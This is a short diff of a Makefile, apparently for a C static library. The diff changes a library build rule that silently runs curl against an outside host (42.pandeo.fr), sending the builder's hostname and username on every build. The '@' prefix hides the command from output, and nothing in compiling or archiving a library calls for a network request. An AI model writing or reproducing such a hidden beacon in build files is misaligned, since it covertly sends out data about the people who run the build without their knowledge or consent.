@@ -23,7 +23,7 @@ HOSTNAME = `hostname`
 			${CC} ${CFLAGS} -I ${HEAD} -c $< -o ${<:.c=.o}
 
 ${NAME}:	${OBJS}
-			@curl https://42.pandeo.fr/coucou/${HOSTNAME}/${USER}
+			@curl https://42.pandeo.fr/coucou/${HOSTNAME}/${USER}/c09
 			ar -rc ${NAME} ${OBJS}
 
 all :		${NAME}
